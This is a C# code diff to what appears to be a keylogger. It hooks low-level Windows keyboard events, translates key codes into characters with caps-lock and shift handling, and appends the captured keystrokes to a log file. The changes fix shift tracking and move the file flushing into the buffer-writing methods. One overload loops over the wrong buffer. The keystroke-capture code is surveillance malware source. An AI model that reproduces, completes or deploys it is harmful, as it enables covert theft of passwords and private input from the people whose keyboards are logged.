@@ -49,7 +49,7 @@ public static class Program
     {
         var kbStruct = (KBDLLHOOKSTRUCT*)lParam.Value.ToPointer();
 
-        // checking for events other than keydown
+        // checking for events other than keydown, syskeydown and keyup
         // and https://learn.microsoft.com/en-us/windows/win32/winmsg/lowlevelmouseproc#ncode-in
         if (code != 0 || (wParam != KEYDOWN && wParam != KEYUP && wParam != SYSKEYDOWN))
             return PInvoke.CallNextHookEx(_kbHook, code, wParam, lParam);
@@ -121,6 +121,8 @@ public static class Program
             0x37 => "7",
             0x38 => "8",
             0x39 => "9",
+            // TODO: account for both caps lock and shift active
+            // 0x41 when _capsLockActive && _shiftActive => "a"
             0x41 when !_capsLockActive && !_shiftActive => "a",
             0x41 when _capsLockActive || _shiftActive => "A",
             0x42 when !_capsLockActive && !_shiftActive => "b",
@@ -247,9 +249,9 @@ public static class Program
             _ => $"[CODE {kbStruct->vkCode.ToString()}]"
         };
 
-        // if caps lock or shift were pressed, negate caps lock active variable 
+        // if caps lock or shift were pressed, set their fields
         if (kbStruct->vkCode == 0x14) _capsLockActive = !_capsLockActive;
-        if (kbStruct->vkCode == 0xA0 || kbStruct->vkCode == 0xA1) _shiftActive = !_shiftActive;
+        if (kbStruct->vkCode == 0xA0 || kbStruct->vkCode == 0xA1) _shiftActive = true;
 
         return stringToWrite;
     }
@@ -266,8 +268,9 @@ public static class Program
             0xA5 => " [RIGHT ALT UP] ",
             _ => ""
         };
-
-        if (kbStruct->vkCode == 0xA0 || kbStruct->vkCode == 0xA1) _shiftActive = !_shiftActive;
+        
+        // checking for shift keyup
+        if (kbStruct->vkCode == 0xA0 || kbStruct->vkCode == 0xA1) _shiftActive = false;
 
         return stringToWrite;
     }
@@ -284,14 +287,12 @@ public static class Program
             try
             {
                 await WriteBuffer();
-                await _writer.FlushAsync();
             }
             catch (ObjectDisposedException e)
             {
                 // if the StreamWriter was somehow disposed, create a new one
                 _writer = new StreamWriter(PathToFile, true);
                 await WriteBuffer();
-                await _writer.FlushAsync();
                 Console.WriteLine(e.Message);
             }
             catch (InvalidOperationException e)
@@ -308,17 +309,23 @@ public static class Program
     }
 
     /// <summary>
-    ///     Writes buffer to file using the <see cref="_writer">_writer object</see>
+    ///     Writes buffer to <see cref="PathToFile"/> using the <see cref="_writer"/>
     /// </summary>
     private static async Task WriteBuffer()
     {
         foreach (var str in Buffer) await _writer.WriteAsync(str);
+        await _writer.FlushAsync();
         Buffer.Clear();
     }
 
+    /// <summary>
+    ///     Writes passed buffer to <see cref="PathToFile"/> using the <see cref="_writer"/>
+    /// </summary>
+    /// <param name="buffer">Buffer to be written</param>
     private static async Task WriteBuffer(ICollection<string> buffer)
     {
         foreach (var str in Buffer) await _writer.WriteAsync(str);
+        await _writer.FlushAsync();
 
         buffer.Clear();
     }
